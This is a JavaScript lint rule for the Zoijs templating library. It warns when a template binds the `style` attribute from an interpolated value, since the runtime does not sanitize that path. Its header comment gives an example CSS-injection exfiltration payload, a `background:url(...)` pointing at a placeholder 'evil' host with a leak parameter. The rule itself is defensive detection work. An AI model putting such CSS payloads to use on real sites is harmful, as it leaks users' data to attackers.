// no-dynamic-style — binding the `style` attribute from a dynamic value is the one
// dynamic-attribute path the Zoijs runtime does NOT sanitize (it isn't a URL attribute
// and isn't a blocked name, so the value reaches `setAttribute("style", …)` raw).
//
// Attacker-controlled CSS can exfiltrate data (`background:url(https://evil/?leak=…)`),
// pull in external resources, or redress the UI. Prefer binding a `class` (toggling
// trusted, predefined styles), or set individual properties from values you control and
// have validated.
//
// Warns, doesn't error: a dynamic `style` is sometimes legitimate (e.g. a computed
// `width:${pct}%`). The point is to make the trust decision explicit. Only flags a
// `style` whose value contains an interpolation; a fully static `style="…"` is fine.

import { isHtmlTemplate, templateText, HOLE } from "../util/scan.js";

const OPEN_TAG = /<[a-zA-Z][a-zA-Z0-9-]*\b((?:"[^"]*"|'[^']*'|[^>])*)>/g;
// A `style` attribute whose value (quoted or unquoted) contains an interpolation hole.
const STYLE_DYNAMIC = new RegExp(
  "(^|\\s)style\\s*=\\s*(?:\"[^\"]*" + HOLE + "|'[^']*" + HOLE + "|" + HOLE + ")",
  "i"
);

/** @type {import("../index.d.ts").ZoijsRuleModule} */
const rule = {
  meta: {
    type: "suggestion",
    docs: {
      description: "Discourage binding the `style` attribute from dynamic values (CSS injection)",
      recommended: true,
      url: "https://zoijs.dev/security",
    },
    schema: [],
    messages: {
      dynamicStyle:
        "Binding `style` from a dynamic value lets attacker-controlled CSS exfiltrate data (e.g. `background:url(…)`). Bind a `class`, or set individual properties from trusted, validated values.",
    },
  },

  create(context) {
    return {
      TaggedTemplateExpression(node) {
        if (!isHtmlTemplate(node)) return;
        const text = templateText(node);
        OPEN_TAG.lastIndex = 0;
        let m;
        while ((m = OPEN_TAG.exec(text))) {
          if (STYLE_DYNAMIC.test(m[1])) {
            context.report({ node, messageId: "dynamicStyle" });
          }
        }
      },
    };
  },
};

export default rule;
